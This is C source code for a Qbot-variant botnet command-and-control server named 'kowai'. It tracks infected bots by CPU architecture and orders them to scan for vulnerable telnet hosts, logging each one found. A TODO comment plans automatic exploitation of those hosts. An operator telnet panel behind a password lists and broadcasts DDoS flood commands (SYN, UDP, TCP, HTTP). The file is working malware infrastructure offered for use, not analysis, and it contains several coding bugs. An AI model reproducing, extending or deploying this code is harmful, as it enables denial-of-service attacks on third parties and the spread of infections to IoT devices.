#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>

#define MAXFDS 1000000

#define RED     "\x1b[1;35m"
#define C_RESET	"\x1b[0m"
#define CYAN	"\x1b[1;36m"
//Kowai Qbot Variant cnc ( :
struct account {
    char user[200]; 
    char password[200];
	char id[200];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
		char x86;
		char mips;
		char mpsl;
		char arm;
		char spc;
		char ppc;
		char m68k;
		char sh4;
		char arc;
		char unk;
        char build[7];
        char connected;
        int Joining;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
		char nickname[20];
        int Joining
} managements[MAXFDS];

//

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

//

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}

static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "kowai could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 7, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[1;33mroot\x1b[0;31m@\x1b[1;33mkowai\x1b[1;36m \x1b[1;35m~ \x1b[0m", 46, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
								clients[events[i].data.fd].arm = 0;
								clients[events[i].data.fd].mips = 0;
								clients[events[i].data.fd].mpsl = 0;
								clients[events[i].data.fd].x86 = 0;
								clients[events[i].data.fd].spc = 0;
								clients[events[i].data.fd].ppc = 0;
								clients[events[i].data.fd].arc = 0;
								clients[events[i].data.fd].unk = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
											
											if(send(infd, ".DSLKFJ\n", 8, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											close(infd);
											continue;
										}
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, ".TSCAN ON\n", 9, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
								client->arm = 0;
								client->mips = 0;
								client->mpsl = 0;
								client->x86 = 0;
								client->spc = 0;
								client->ppc = 0;
								client->arc = 0;
								client->unk = 0;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
												if(strstr(buf, "LOCKED ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "LOCKED ") + 7; 
                                                        fprintf(fileFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(fileFD);
												//TODO: automatically exploit that particular IP after scanning for dir and uploading correct arch stuffs.
                                                        continue;
                                                }
												if(strstr(buf, "[kowai] Joining [ARCH:x86]") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "[kowai] Joining [ARCH:MIPS]") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "[kowai] Joining [ARCH:MPSL]") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "[kowai] Joining [ARCH:ARM]") == buf)
												{
													client->arm = 1; 
												}
												if(strstr(buf, "[kowai] Joining [ARCH:PPC]") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "[kowai] Joining [ARCH:SPC]") == buf)
												{
													client->spc = 1;
												}
												if(strstr(buf, "[kowai] Joining [ARCH:ARC]") == buf)
												{
													client->arc = 1;
												}
												if(strstr(buf, "[kowai] Joining [ARCH:UNK]") == buf)
												{
													client->unk = 1; 
												}
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
										client->arm = 0;
										client->mips = 0;
										client->mpsl = 0;
										client->x86 = 0;
										client->spc = 0;
										client->ppc = 0;
										client->arc = 0;
										client->unk = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int mpslJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Joining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int arcJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arc) continue;
                total++;
        }
 
        return total;
}

unsigned int unkJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unk) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsJoining()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].Joining) continue;
                total++;
        }
 
        return total;
}
 

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

void client_addr(struct sockaddr_in addr) 
{
	printf("[%d.%d.%d.%d]\n",
	addr.sin_addr.s_addr & 0xFF,
	(addr.sin_addr.s_addr & 0xFF00)>>8,
	(addr.sin_addr.s_addr & 0xFF0000)>>16,
	(addr.sin_addr.s_addr & 0xFF000000)>>24);
}

void *titleWriter(void *sock) {
        int find_line;
				int thefd = (long int)sock;
				char string[2048];
				while(1)
				{
						memset(string, 0, 2048);
						sprintf(string, "%c]0;%d Connected | %s%c", '\033', clientsJoining(), accounts[find_line].user, '\007');
						if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
		
						sleep(2);
				}
		}

void *telnetWorker(void *sock) 
{ 
        int managesJoining = 0;
        int thefd = (long int)sock;
        managesJoining++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
		
		char *admin = "admin";
		int attks;
		int adminJoining = 0;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r");
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id);
            ++j;
        }
        sprintf(botnet, ""RED"Username\x1b[1;33m:\x1b[37m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
		FILE *conLog;
        conLog = fopen("connection.log", "a");
        fprintf(conLog, "[LOGIN ATTEMPT] USER: %s\n", nickstring);
        fclose(conLog);
		printf("[LOGIN ATTEMPT] USER: %s\n", nickstring);
        if(strcmp(nickstring, accounts[find_line].user) == 0){                 
        sprintf(botnet, ""RED"Password\x1b[1;33m:\x1b[37m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		FILE *conLog2;
        conLog2 = fopen("connection.log", "a");
        fprintf(conLog2, "[FAILED ATTEMPT] USER: %s\n", nickstring);
        fclose(conLog2);
        goto end;
        fak:
        
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		
        char line1[80];
        sprintf(line1, ""RED"%s"CYAN"@"RED"kowai"CYAN" ~ "C_RESET, accounts[find_line].user);
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		
		pthread_create(&title, NULL, &titleWriter, sock);
		managements[thefd].Joining = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        
		if(strstr(buf, "/total")) 
        {  
			sprintf(botnet, "\x1b[0mkowai.total: "RED"%d"C_RESET"\r\n", clientsJoining());
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		
        if(strstr(buf, "/b")) 
        {
            char arm  [128];
            char mips  [128];
            char mpsl  [128];
            char x86  [128];
            char spc  [128];
            char ppc  [128];
            char arc  [128];
            char unk [128];
			char total [128];
			
            sprintf(arm,  "\x1b[1;35mkohan.arm \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", armJoining());
            sprintf(mips,  "\x1b[1;35mkohan.mips \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", mipsJoining());
            sprintf(mpsl,  "\x1b[1;35mkohan.mpsl \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", mpslJoining());
            sprintf(x86, "\x1b[1;35mkohan.x86 \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", x86Joining());
            sprintf(spc,  "\x1b[1;35mkohan.spc \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", spcJoining());
            sprintf(ppc,  "\x1b[1;35mkohan.ppc \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", ppcJoining());
            sprintf(arc,  "\x1b[1;35mkohan.arc \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", arcJoining());
            sprintf(unk, "\x1b[1;35mkohan.unknown \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", unkJoining());
            sprintf(total, "\x1b[1;35mkohan.total \x1b[1;35m[\x1b[1;36m%d\x1b[1;35m]\x1b[0m\r\n", clientsJoining());
            if(send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, mpsl, strlen(mpsl), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, arc, strlen(arc), MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, unk, strlen(unk), MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
        }  
		
		if(strstr(buf, "help")) 
        {			
			sprintf(botnet, "\x1b[0mddoscmds - shows ddos commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "servercmds - server side commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "admincmds - admin commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		if(strstr(buf, "servercmds")) 
        {			
			sprintf(botnet, "\x1b[0mbots - shows bot count\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "exit - disconnect from net\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "help - displays help menu\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			
        }
		if(strstr(buf, "admincmds")) 
        {			
			if(strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(botnet, "\x1b[0mbtype - shows architecture of bots Joining\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
			else
			{
				sprintf(botnet, "You Must Be Admin to Use This Command!\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
			
        }
		
		if(strstr(buf, "ddoscmds")) 
        {			
			sprintf(botnet, "\x1b[0m. S [TARGET] [PORT] [TIME] [SIZE]\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, ". HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, ". U [TARGET] [PORT] [TIME] 32 0 10\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, ". T [TARGET] [PORT] [TIME] 32 all 0 10\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		if (strncmp(buf, ". S", 3) == 0 || strncmp(buf, ". U", 3) == 0 || strncmp(buf, ". T", 3) == 0 || strncmp(buf, ". H", 3) == 0)
        {
			sprintf(botnet, "\x1b[0m");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			if(send(thefd, "Attack Sent! \r\n", 17, MSG_NOSIGNAL) == -1) goto end;
			FILE *logFile;
			logFile = fopen("actions.log", "a");
			fprintf(logFile, "[kohan] [%s] [Sent an Attack!]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[kowai] [%s] [Sent an Attack!]\n", accounts[find_line].user);
        }
		
		if(strstr(buf, ". KT")) 
        {  
			sprintf(botnet, "\x1b[0mRail Gun Disarmed!\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			
			FILE *logFile;
			logFile = fopen("actions.log", "a");
			fprintf(logFile, "[kowai] [%s] [Killed All Pid's]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[kowai] [%s] [Killed All Pid's]\n", accounts[find_line].user);
        }
		
        if (strstr(buf, "cls")) 
		{
			if(send(thefd, "\033[1A\033[2J\033[1;1H", 16, MSG_NOSIGNAL) == -1) goto end;
        }
		
        if (strstr(buf, "exit")) 
		{
			goto end;
			if(strcmp(admin, accounts[find_line].id) == 0);
		}
	
                trim(buf);
                sprintf(line1, ""RED"%s"CYAN"@"RED"kowai"CYAN"#: "C_RESET, accounts[find_line].user);
                if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].user, buf);
				FILE *logFile;
                logFile = fopen("chat.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].user, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:
                managements[thefd].Joining = 0;
                close(thefd);
                managesJoining--;
}
 
void *telnetListener(int port)
{    
		int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("[kowai] [Admin Joining] ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("connection.log", "a");
                fprintf(logFile, "[kowai] [Admin Joining] [%d.%d.%d.%d]", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], char **sock)
{
        signal(SIGPIPE, SIG_IGN);
 
        int s, threads, port;
        struct epoll_event event;
        char Username[20], Password[20];
        
		if (argc != 4)
        {
			fprintf (stderr, "[kowai] Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
        fileFD = fopen("telnet.txt", "a+"); 
		port = atoi(argv[3]);
        threads = atoi(argv[2]);
        
		if (threads > 850)
        {
			printf("[kowai] Lower Threading Count.\n");
            return 0;
        }

        printf("[kowai] Socket Opened On Port %d\n", port);

        listenFD = create_and_bind(argv[1]);
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
			perror ("listen");
			abort ();
        }
 
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
			perror ("epoll_create");
			abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
			perror ("epoll_ctl");
			abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
			pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
			broadcast("PING", -1, "kowai");
			sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}